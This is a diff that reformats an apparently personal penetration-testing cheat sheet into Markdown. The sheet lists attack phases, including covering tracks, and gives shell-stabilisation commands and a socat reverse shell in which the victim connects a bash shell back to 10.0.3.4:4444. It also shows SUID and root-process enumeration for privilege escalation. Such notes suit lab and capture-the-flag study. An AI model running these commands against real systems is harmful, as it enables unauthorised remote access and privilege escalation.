@@ -1,4 +1,4 @@
-Cheat Sheet
+# Cheat Sheet
 ___________
 
     Recon - Scan for vulnarable targets, gather info on target.
@@ -16,62 +16,52 @@ ___________
     Cleanup - Leave no trace behinde
 ___________
 
+## Stabilize Shell
 
-
-# Stabilize Shell
-
-#####################
 python -c 'import pty; pty.spawn("/bin/bash")'
 
 export TERM=xterm
 
 stty raw -echo; fg
 
-***************************
 
+## Get reverse shell
 
 atk:
 socat file:`tty`,raw,echo=0 tcp-listen:4444
 victim:
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
-#####################
 
 
-# List all processes runing as root
-
+## Useful enumeration comands
+### List all processes runing as root
+```
 ps -aux | grep root
-
-# List all executibles with SUID set
-
+```
+### List all executibles with SUID set
+```
 find / -perm -u=s -type f 2>/dev/null
-
-# Start a quick HTTP server
-
+```
+### Start a quick HTTP server
+```
 python3 -m http.server [PORT]
+```
+## Usefull common Linux commands
 
-___________
-
-Common Linux Commands
-
-___________
-
-# Make file executable
-
-
+Make file executable
+```
 chmod +x filename
-
-
-# Double click in terminal
-
+```
+Double click in terminal
+```
 xdg-open [FILENAME]
-
-
-# What shell am I using
-
+```
+What shell am I using
+```
 echo $0
-
-# Only show matches
-
+```
+Only show matches
+```
 2> /dev/null
-
+```
 
